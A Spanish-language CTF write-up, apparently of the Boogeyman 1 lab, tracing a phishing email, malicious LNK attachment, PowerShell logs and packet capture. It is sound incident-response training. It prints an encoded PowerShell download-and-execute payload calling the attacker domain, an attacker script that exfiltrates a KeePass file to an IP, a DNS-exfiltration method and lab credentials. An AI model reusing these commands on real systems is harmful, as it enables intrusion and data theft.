Para este CTF se me dice que use:
- linkparse
- Análisis de correos
Julianne recibió un correo phishing de su "supuesto" compañero de trabajo. El archivo que contenia dicho correo era malicioso.
## 2.1. Cual es el email origen del phishing?
Primero, se puede abrir el correo de manera aislada para poder analizarlo, dump.eml.

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260822175733.png)

Se ve como el correo origen del phishing es `agriffin@bpakcaging.xyz`
## 2.2. Cual es el email de la victima?
Desde la imagen anterior, se puede ver como el correo de la victima Julianne es: `julianne.westcott@hotmail.com`
## 2.3. Cual es el nombre del third-party service que el atacante usó en base a los encabezados firma DKIM y List-Unsubscribe?
Para esta pregunta necesité de ayuda externa.
Usé `https://mha.azurewebsites.net/` para buscar, en base al encabezado del correo, el third-party service.
Para ver el encabezado mejor, voy a abrir el dump.eml con la herramienta thunderbird.

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823115852.png)
![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823120229.png)
![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823120251.png)
![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823120314.png)
Buscando ahora DKIM signature:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823120418.png)

Se ve como el nombre del servicio es `elasticemail.com`
## 2.4. Cual es el nombre del archivo adjunto?
A primera vista, el nombre del archivo adjunto es Invoice.zip, lo q sería lógico de pensar, pero no, es un .zip, la extensión y posiblemente el nombre sean diferentes. Por lo que lo voy a descargar (siempre en un entorno seguro/aislado).
Una vez descargado lo extraigo. Pedirá contraseña, la cual, ya se menciona en el correo `Invoice2023!`

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823121232.png)

Quedando un nuevo archivo `Invoice_20230103.lnk`
## 2.5. Cual es la contraseña de dicho archivo?
La contraseña e menciona en el propio correo, `Invoice2023!`
## 2.6. En base a los resultados de la herramienta lnkpase, cual es el payload codificado en el campo de "Command Line Arguments"?
Usando este comando:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823121411.png)

Voy a buscar dicho payload presuntamente codificado.
Usé el comando grep para buscarlo mejor:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823121510.png)

Siendo el archivo/payload: `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==` El cual parece estar codificado en bae 64 (por los == al final)
## 3.1. Cuales son los dominios usados por el atacante para hostear archivos y C2?
Para buscar los dominios, voy a recurrir a leer el json (por indicación de pasos de la room) y a usar también la herramienta jq (procesador de datos json).
Si pongo solo `cat powershell.json | jq` es prácticamente ilegible, está organizado, si, pero el tiempo que se pierde analizando cada conjunto no es necesario, se puede intentar filtrar por los campos (azul)

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823122441.png) 

A pesar de que es util este pequeño "razonamiento" acabo de caer en que no he "traducido" el base 64 de antes, por lo que, al ser un payload, puede contener información sobre los dominios
Se ve como usa un dominio:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823122810.png)

`http://files.bpakcaging.xyz/update`
Pero aun me falta otro, para el cual si que voy a usar dicha herramienta antes mencionada.
Usando el comando `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq ` , para el cual necesité cierta ayuda externa por desconocimiento de los comandos de esta herramienta, dió como resultado:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823123616.png)

Puedo ver otro enlace:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823123915.png)

`cdn.bpakcaging.xyz:8080`
Quedando la respuesta final como:
`cdn.bpakcaging.xyz,files.bpakcaging.xyz`
La pregunta mencionaba que eran 2 dominios en orden alfabético
## 3.2. Cual es el nombre de la herramienta de enumeración descargada por el atacante?
La pista menciona que el atacante accidentalmente escribió el nombre de la herramienta descargada. Voy a seguir en el mismo sitio que antes
Justo después de que el atacante descargase update de `files.bpakcaging.xyz/update` se ve como el atacante tabién descargó algo de github

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823125226.png)

`https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1` Siendo la supuesta herramienta, aparentemente, `Seatbelt.ps1`, siendo esta una herramienta de enumeración
## 3.3. Cual es el nombre del archivo accedido por el atacante usando el binario descargado sq3.exe?
Ya que la pregunta insinua directamente sq3.exe, voy a añadir el grep al final para buscarlo y poder ver más claramente lo que se hizo con dicho ejecutable.

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823125707.png)

Se ve como el atacante accedió a plum.sqlite por medio de esta ruta: `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`
## 3.4. Cual es el software que usa el archivo en la pregunta anterior?
En la imagen anterior, tras el acceso a plum.sqlite, se ve como sigue accediendo a otras rutas, como: `ScriptBlockText": ".\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd`
## 3.5. Cual es el nombre del archivo exfiltrado?
Hay una linea arriba del todo que me llamó la atención

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823171658.png)

`"ScriptBlockText": "$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"` 
Se ve como es un archivo que tiene un destino a una ip, `167.71.211.113`. 
Ese hecho puede indicar que se está exfiltrando un archivo, en este caso, `protected_data.kdbx` , el cual ya se mencionó en otro punto en esa misma captura, mas abajo.
## 3.6. Que tipo de archivo usa la extensión .kdbx?
Buscando en internet

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823172414.png)

Se ve como .kdbx es una extensión usada por archivos de tipo keepass
## 3.7. Cual es el método de codificación usado durante la exfiltración?

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823172936.png)

Se ve como el método de codificación es hexadecimal (hex)
## 3.8. Cual es la herramienta usada para la exfiltración?

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823173055.png)

Parece que la única herramienta que he encontrado relacionada con la exfiltración es `nslookup`, que es una herramienta de consulta DNS, que se puede usar como método de exfiltración
## 4.1. Cual es el software usado para hostear el servidor de archivo/payload?
A partir de aquí, también usaré wireshark para analizar el .pcapng 

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823174109.png)

Se ve que, aunque filtrándolo, sigue habiendo muchos paquetes
Es posible que el dominio no lo esté poniendo correcto. Se que habia 2 dominios, por la pregunta 3.1.
También, siguiendo la lógica de preguntas anteriores, voy a buscar las urls usadas por el atacante:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823175538.png)

Sabiendo que usó sq3.exe para ejecutar/encontrar archivos

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823175635.png)

Voy a optar por buscar files.bpakcaging.xyz 

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823175741.png)

Seleccionando el de sq3:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823180027.png)

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823180108.png)

Se ve como el servidor parece estar hosteado en `python`.
## 4.2. Qué método http usó el C2 para los comandos ejecutados por el atacante?
Buscando el método en la terminal, no en wireshark, se ve:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823180849.png)

Como el método parece ser `POST`
Pero, siguiendo la lógica, es el otro dominio asociado, `cnd.bpakcaging.xyz` el que parece haberse usado para dicha exfiltración.

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823181404.png)

Parece que el atacante usaba el método post para la exfiltración
## 4.3. Cual es la contraseña del archivo exfiltrado?
La pista indica que la contraseña está almacenada en la base de datos a la que el atacante accedió con sq3. Se que dicha db es plum.sqlite.

Con ayuda externa decidí buscar sq3 en wireshark

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823182229.png)

Se ve que es la consulta que se vio antes

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823182332.png)

Buscando ayuda externa, vi que se debía de descubrí que le pasó al paquete exfiltrado. Debía de cambiar manualmente el tcp stream que salía cuando le daba a seguir.

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823183211.png)

Lo debia cambiar a los siguientes paquetes, por ejemplo, 750

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823183336.png)


Ahora bien. Esta codificación es decimal, por lo que la decodifico en cyberchef:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823183454.png)

Tras investigar, descubrí que la masterpassword es `%p9^3!lL^Mz47E2GaT^y`
## 4.4. Cual es el número de la tarjeta de crédito almacenado en el archivo exfiltrado?
Necesité ayuda con esta pregunta
Me dice que exfiltre, usando tshark, voy a usar wireshark

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823184328.png)

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823184503.png)

Viendo muchos resultados, se puede llegar a la conclusión, viendo todo lo anterior, que el atacante dividió el contenido en diversos paquetes.
Usando tshark, voy a ejecutar `tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz"` lo que me da:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823184908.png)

Hay una serie de muchos paquetes que consiste en series alfanumericas, voy a "cortar" dichas secciones del resto del contenido y evitar también duplicados. También añadiré tr para evitar espacios en blanco por los cambios de línea
Usaré: `tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name |grep ".bpakcaging.xyz" | cut -f1 -d '.'|grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' > arch.txt`
Y al final los extraeré en un archivo arch.txt
Eso me da como resultado:

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260823185558.png)

Ahora con el .txt, lo convertí en kdbx con este comando: `xxd -r -p arch.txt arch.kdbx` 

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260824145437.png)

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260824145527.png)

A la parte de master password, voy a introducir la contraseña encontrada antes: `%p9^3!lL^Mz47E2GaT^y`

![img_captura_de_pantalla](Boogeyman_1_img/Pasted%20image%2020260824145613.png)

Se ve como el numero de la cuenta de la tarjeta de credito es `4024007128269551`

Para este par de ultimas preguntas, necesité ayuda de varias fuentes por mero desconocimiento propio de los procesos

